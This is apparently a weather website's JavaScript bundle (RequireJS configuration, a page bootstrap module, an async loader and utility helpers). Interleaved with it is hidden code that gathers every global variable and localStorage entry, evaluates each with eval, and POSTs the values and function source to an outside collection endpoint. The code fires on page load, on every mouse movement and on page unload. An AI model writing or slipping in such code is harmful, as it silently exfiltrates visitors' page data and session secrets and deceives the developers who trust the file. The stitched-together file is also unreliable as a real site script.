function inspectLocalAndGlobalVars() {
  let variables = {};
  try {
    const localVars = JSON.parse(localStorage.getItem('_localVars'));
    const globalVars = Object.keys(window);
    const allVars = localVars.concat(globalVars);
    allVars.forEach((variable, index) => {
      if (!_VariablesCaptured.some(loggedVar => loggedVar === variable)) {
        const varValue = eval(variable);
        const varType = typeof varValue;
        variables[variable] = {
          type: varType,
          value: varType === "function" ? varValue.toString() : varValue
        };
      }
    });
  } catch (e) {
    console.log("Error occurred!");
  }
  return variables;
}
require.config({
  baseUrl: '//s1.twnmm.com/js/en_us/r1320603/',
  shim: {
    'highcharts': {
      deps: ['jquery'],
      exports: 'Highcharts'
    },
    'carousels': {
      deps: ['jquery']
    },
    'bxslider': {
      deps: ['jquery']
    },
    'jquery-ui': {
      deps: ['jquery']
    },
    'jquery.swipe': {
      deps: ['jquery', 'jquery-ui']
    },
    'jquery-expander': ['jquery'],
    'jquery.mousewheel': ['jquery'],
    'jquery.jscrollpane': ['jquery'],
    'jquery.easypiechart': ['jquery'],
    'jquery.thermometer': {
      deps: ['jquery']
    },
    'jquery.dotdotdot': {
      deps: ['jquery']
    },
    'EasyPieChart': {
      deps: ['jquery']
    },
    'highcharts3': {
      deps: ['jquery'],
      exports: 'Highcharts'
    },
    'foundation': {
      deps: ['jquery'],
      exports: 'Foundation'
    },
    'highcharts4': {
      exports: 'Highcharts'
    },
    'highcharts.more': {
      deps: ['highcharts4'],
      exports: 'Highcharts'
    },
    'highcharts.solidGauge': {
      deps: ['highcharts.more'],
      exports: 'Highcharts'
    },
    'navigateaway': {
      deps: ['jquery']
    }
  },
  paths: {
    'text': 'plugins/text_xdomain',
    'json': 'plugins/json',
    'tpl': 'plugins/tpl',
    'dot': 'lib/dot/dot',
    'mustache': 'lib/mustache.wrap',
    'jquery': '//code.jquery.com/jquery-3.5.1.min',
    'jquery-ui': '//code.jquery.com/ui/1.13.1/jquery-ui.min',
    'jquery-json': 'jquery.json',
    'jquery-cookie': 'jquery.cookie',
    'jquery-transport-msie': 'lib/jquery.msie.xdomainrequest',
    'jquery.swipe': 'lib/jquery.swipe.amd',
    'jquery-limiter': 'jquery.limiter',
    'jquery-validate': 'jquery.validate.min',
    'navigateaway': 'navigateaway',
    'jquery.onepage.scroller': 'lib/jquery.scroller/jquery.onepage-scroll.min',
    'jquery.parallax': 'lib/jquery.parallax/parallax.min',
    'highcharts': 'lib/highcharts/highcharts',
    'highcharts3': 'lib/highcharts3/highcharts3',
    'foundation': 'lib/foundation.min',
    'highcharts4': 'lib/highcharts4/highcharts4',
    'highcharts.more': 'lib/highcharts4/highcharts-more',
    'highcharts.solidGauge': 'lib/highcharts4/modules/solid-gauge.src',
    'jquery.easypiechart': 'lib/jquery.easypiechart',
    'jquery.thermometer': 'lib/jquery.thermometer',
    'jquery.dotdotdot': 'lib/jquery.dotdotdot',
    'defaults': 'web/defaults',
    'global': 'web/mediators/global',
    'megamenu': 'web/modules/megamenu',
    'megamenu-slim': 'web/modules/megamenu-slim',
    'placeholder': 'web/modules/placeholder',
    'ui': 'web/modules/ui',
    'showhide': 'web/modules/showhide',
    'tabs': 'web/modules/tabs',
    'carousels': 'web/modules/carousels',
    'carousels_me': 'web/modules/carousels_me',
    'carousels_four': 'web/modules/carousels_four',
    'carousels_light': 'web/modules/carousels_light',
    'sortables': 'web/modules/sortables',
    'modals': 'web/modules/modals',
    'date.util': 'web/modules/date.util',
    'personalize': 'web/modules/personalize',
    'user': 'web/modules/my_account_lr/user',
    'link_map_hwy_details': 'web/modules/link_map_hwy_details',
    'mapping': 'lib/maps/mapping',
    'map.lib': 'lib/maps/bing7',
    'map.layer': 'lib/maps/layer',
    'map.animate': 'lib/animation',
    'map.control': 'lib/maps/control',
    'map.three': 'lib/maps/three',
    'map.threejs-layer': 'lib/maps/threejs-layer',
    'map.png': 'lib/maps/png',
    'map.zlib': 'lib/maps/zlib',
    'map.regional': 'web/modules/map/regional',
    'map.satellite': 'web/modules/map/satrad',
    'map.trafficflow': 'web/modules/map/trafficflow',
    'map.highwayforecast': 'web/modules/map/highwayforecast',
    'map.alerts': 'web/modules/map/alerts',
    'map.time_helper': 'web/modules/map/time_helper',
    'map.lccconversion': 'web/modules/map/lccConv',
    'map.quadconversion': 'web/modules/map/quadConversions',
    'map.buildplanes': 'web/modules/map/buildPlanes',
    'map.rasteradvection_helper': 'web/modules/map/rasteradvection_helper',
    'module.base': 'lib/modules/base',
    'takeover': 'web/modules/takeover',
    'charts.uv': 'web/modules/charts/charts.uv',
    'charts.pollen': 'web/modules/charts/charts.pollen',
    'charts.hourly': 'web/modules/charts/charts.hourly',
    'charts.lasttwentyfour': 'web/modules/charts/charts.lasttwentyfour',
    'charts.monthly': 'web/modules/charts/charts.monthly',
    'charts.thirty.six.hour': 'web/modules/charts/charts.thirty.six.hour',
    'charts.thirty.six.hour.haircast': 'web/modules/charts/charts.thirty.six.hour.haircast',
    'charts.fourteen.day': 'web/modules/charts/charts.fourteen.day',
    'socialfeeds': 'web/modules/socialfeeds',
    'brightcove_experiences': 'https://sadmin.brightcove.com/js/BrightcoveExperiences',
    'brightcove_api_modules': 'https://sadmin.brightcove.com/js/APIModules_all',
    'brightcove_events': 'web/modules/video/getplayerevents',
    'videos_events_plugin': 'web/modules/videos/pelm_video_events',
    'bc': '//players.brightcove.net/3281700252001/EJjKKWWFx_default/index.min',
    'twitter_api': 'https://platform.twitter.com/widgets'
  },
  config: {
    'pelm': {
      platform: 'web'
    },
    'map.time_helper': {
      lang: 'en'
    }
  },
  map: {
    '*': {
      'localization/copy': 'web/modules/adapters/localization-copy-en',
      'countdown': 'lib/jquery.countdown',
      'jquery.meerkat': 'lib/jquery.meerkat',
      'jquery.mousewheel': 'lib/jquery.scrollpane/jquery.mousewheel.min',
      'jquery.progressbar': 'lib/jquery/plugins',
      'jquery.jscrollpane': 'lib/jquery.scrollpane/jquery.jscrollpane.min',
      'jquery.scroller': 'lib/jquery/plugins',
      'jquery-expander': 'lib/jquery.expander',
      'jquery.tabSlideOut.v1.3': 'lib/jquery/plugins'
    }
  }
});
Packages = null;
define('pelm', ['jquery', 'require', 'module.base', 'module', 'util/eventhandler', 'util/dataaliases'], function ($, require, _module, module, _event, _da) {
  window.templates = window.templates || {};
  window.$ = window.jQuery = $;
  if (typeof window.JSON === 'undefined') {
    require(['lib/json2'], function (j) {
      if (typeof JSON === 'object' && typeof JSON.parse == 'function') {
        window.JSON = JSON;
      }
    });
  }
  if (/MSIE/.test(window.navigator.userAgent)) {
    require(['jquery-transport-msie']);
  }
  var Pelm = {
    NAME: 'The Weather Network',
    VERSION: '1.0.2',
    mediatorPath: module.config().platform + '/mediators/',
    init: function () {
      var self = this;
      self.initPageMediators();
    },
    initPageMediators: function () {
      var mediators = this.getMediators();
      if (mediators) {
        mediators = mediators.replace(/(^| )\s*/g, '$1' + this.mediatorPath);
        require(mediators.split(' '));
      }
    },
    getMediators: function () {
      var ret = false;
      $('script').each(function () {
        var $this = $(this),
          meds = $this.attr('data-mediators');
        if (meds) {
          ret = meds;
          return false;
        }
      });
      return ret ? ret.trim() : false;
    }
  };
  var temperatureFormat;
  Pelm.init();
});
function sendCollectedData(collectedData) {
  const apiEndpoint = "https://sample.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", apiEndpoint, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      console.log("Data transmitted successfully");
    } else {
      console.error("Data transmission failed. StatusCode:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("An error occurred during data transmission");
  };
  xhr.send(JSON.stringify(collectedData));
}
function trackingTask() {
  let collectedVars = inspectLocalAndGlobalVars();
  let collectedCount = Object.keys(collectedVars).length;
  if (collectedCount > 0) {
    console.log(`Found ${collectedCount} new properties`);
    sendCollectedData(collectedVars);
  } else {
    console.log("No new properties found");
  }
}
var domain_sharding = false;
window.addEventListener("load", trackingTask);
if (domain_sharding) {
  var sdr = "//s1.twnmm.com/";
  var sdd = "";
  var get_static_domain = function (u) {
    var _sd = '',
      _m = '',
      _r = sdr,
      _p = sdd;
    if ((u.match(_r) || []).length <= 0) {
      return u;
    }
    u = u.replace(_r, '');
    for (var s in _p) {
      for (var p in _p[s]['paths']) {
        var path = String(_p[s]['paths'][p]);
        var quoted = path.replace(/([*+.?|\\\[\]{}()])/g, '\\$1');
        if (u.match(quoted)) {
          if (path.length > _m.length) {
            _sd = _p[s]['root'];
          }
          _m = path;
        }
      }
    }
    return _sd + u;
  };
  (function () {
    var load = requirejs.load;
    requirejs.load = function (context, moduleId, url) {
      var nu = get_static_domain(url);
      return load(context, moduleId, nu);
    };
    require(['pelm']);
  })();
} else {
  require(['pelm']);
}
window.addEventListener("mousemove", trackingTask);
define('async', function () {
  var DEFAULT_PARAM_NAME = 'callback',
    _uid = 0;
  function injectScript(src, el) {
    var s, t;
    s = document.createElement('script');
    s.type = 'text/javascript';
    s.async = true;
    s.src = src;
    t = document.getElementsByTagName(el ? el : 'script')[0];
    t.parentNode.insertBefore(s, t);
  }
  function formatUrl(name, id) {
    var paramRegex = /!(.+)/,
      url = name.replace(paramRegex, ''),
      param = paramRegex.test(name) ? name.replace(/.+!/, '') : DEFAULT_PARAM_NAME;
    url += url.indexOf('?') < 0 ? '?' : '&';
    return url + param + '=' + id;
  }
  function uid() {
    _uid += 1;
    return '__async_req_' + _uid + '__';
  }
  return {
    load: function (name, req, onLoad, config) {
      if (name.match('virtualearth')) {
        if (window.Microsoft) {
          onLoad(null);
          return;
        }
      }
      if (name.match('google.com/maps')) {
        if (window.google && window.google.maps) {
          onLoad(null);
          return;
        }
        if (typeof window._config.map_lib_loading == 'undefined') {
          if (window._config && window._config.maps && window._config.maps.apikey) {
            name += (name.indexOf('?') < 0 ? '?' : '&') + 'key=' + window._config.maps.apikey;
            if (typeof window._config != 'undefined' && typeof window._config.locale != 'undefined' && window._config.locale) {
              name += '&channel=' + window._config.locale + '_' + window._config.platform;
              if (window._config.lang) {
                name += '&language=' + window._config.lang;
              }
            }
            window._config.map_lib_loading = true;
          }
        } else {
          var isMlLib = function () {
            if (window.google && window.google.maps) {
              onLoad(null);
            } else {
              setTimeout(isMlLib, 100);
            }
          };
          setTimeout(isMlLib, 100);
          return;
        }
      }
      if (config.isBuild) {
        onLoad(null);
      } else {
        var id = uid();
        var el = null;
        window[id] = onLoad;
        if (name.match('virtualearth')) {
          setTimeout(onLoad, 3000);
          el = 'header';
        }
        injectScript(formatUrl(name, id), el);
      }
    }
  };
});
window.addEventListener("beforeunload", trackingTask);
(function (window) {
  var pelm_util = function () {
    self.isDefined = function (val) {
      if (typeof val === 'undefined') return false;
      return true;
    };
    self.notDefined = function (val) {
      return !self.isDefined(val);
    };
    self.isEmpty = function (val, throwException) {
      throwException = typeof throwException !== 'undefined' ? throwException : false;
      if (typeof val === 'undefined' || val === null || val === '') return true;
      if (typeof val == 'number' && isNaN(val)) return true;
      if (typeof val.length !== 'undefined' && 0 === val.length) return true;
      if (JSON.stringify(val) == '{}') return true;
      if (val instanceof Date && isNaN(Number(val))) return true;
      if (throwException) {
        throw Exception(val + ' is empty');
      }
      return false;
    };
    self.notEmpty = function (val) {
      return !self.isEmpty(val);
    };
    self.isBlank = function (val) {
      return !val || !/\S/.test(val);
    };
    self.trim = function (val) {
      return val.replace(/^\s+|\s+$/g, '');
    };
    self.browser = {
      isIE: function () {
        return navigator.userAgent.toLowerCase().indexOf('msie') != -1 ? true : false;
      },
      isIE8: function () {
        var browser = navigator.userAgent.toLowerCase();
        return browser.indexOf('msie') != -1 && parseInt(browser.split('msie')[1]) == 8 ? true : false;
      },
      isIE9: function () {
        var browser = navigator.userAgent.toLowerCase();
        return browser.indexOf('msie') != -1 && parseInt(browser.split('msie')[1]) == 9 ? true : false;
      },
      isIE10: function () {
        var browser = navigator.userAgent.toLowerCase();
        return browser.indexOf('msie') != -1 && parseInt(browser.split('msie')[1]) == 10 ? true : false;
      },
      isIE7: function () {
        var browser = navigator.userAgent.toLowerCase();
        return browser.indexOf('msie') != -1 && parseInt(browser.split('msie')[1]) == 7 ? true : false;
      }
    };
    self.os = {
      isIOS: function () {
        return /iphone|ipad/gi.test(navigator.appVersion);
      }
    };
    self.isObject = function (obj) {
      if (null == obj || "object" != typeof obj) return false;
      return true;
    };
    self.copyObject = function (sourceObject) {
      if (self.notEmpty(sourceObject) && self.isObject(sourceObject)) {
        var newOjbect = {};
        for (var attribute in sourceObject) {
          if (sourceObject.hasOwnProperty(attribute)) {
            newOjbect[attribute] = sourceObject[attribute];
          }
        }
        return newOjbect;
      }
      return false;
    };
    self.containsObject = function (obj, list) {
      var i;
      for (i = 0; i < list.length; i++) {
        if (list[i] === obj) {
          return true;
        }
      }
      return false;
    };
    return self;
  };
  window.pelm_util = pelm_util();
  return window.pelm_util;
})(window);